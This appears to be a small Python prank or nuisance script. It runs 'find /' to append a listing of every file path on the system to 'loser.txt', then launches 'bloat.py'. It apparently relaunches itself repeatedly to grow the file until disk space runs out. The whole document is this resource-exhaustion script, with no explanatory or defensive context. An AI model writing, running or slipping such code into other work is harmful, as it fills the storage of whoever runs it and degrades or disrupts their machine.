import os
from time import sleep
cmd = "find / >> loser.txt"
os.system(cmd)
sleep(1)
cmd = "python3 bloat.py"
os.system(cmd)
